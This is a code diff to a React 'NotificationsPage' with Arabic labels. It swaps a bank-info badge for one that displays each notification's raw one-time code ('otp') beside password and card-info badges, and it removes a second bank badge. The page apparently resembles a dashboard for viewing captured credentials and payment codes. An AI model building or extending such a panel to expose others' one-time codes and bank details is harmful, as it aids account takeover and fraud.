@@ -1590,11 +1590,9 @@ export default function NotificationsPage() {
                               : "لا يوجد معلومات"}
                           </Badge>
                           <Badge
-                            variant={
-                              notification.bank ? "default" : "secondary"
-                            }
+                            variant={notification.otp ? "default" : "secondary"}
                             className={`cursor-pointer transition-all hover:scale-105 ${
-                              notification.bank
+                              notification.otp
                                 ? "bg-gradient-to-r from-green-500 to-green-600 text-white"
                                 : ""
                             }`}
@@ -1603,9 +1601,7 @@ export default function NotificationsPage() {
                             }
                           >
                             <CreditCard className="h-3 w-3 mr-1" />
-                            {notification.bank
-                              ? "معلومات البنك"
-                              : "لا يوجد بنك"}
+                            {notification.otp ? notification.otp : "كود "}
                           </Badge>
                         </div>
                       </td>
@@ -1773,18 +1769,6 @@ export default function NotificationsPage() {
                           {notification.password
                             ? "معلومات شخصية"
                             : "لا يوجد معلومات"}
-                        </Badge>
-                        <Badge
-                          variant={notification.bank ? "default" : "secondary"}
-                          className={`cursor-pointer ${
-                            notification.bank
-                              ? "bg-gradient-to-r from-green-500 to-green-600 text-white"
-                              : ""
-                          }`}
-                          onClick={() => handleInfoClick(notification, "card")}
-                        >
-                          <CreditCard className="h-3 w-3 mr-1" />
-                          {notification.bank ? "معلومات البنك" : "لا يوجد بنك"}
                         </Badge>
                       </div>
 
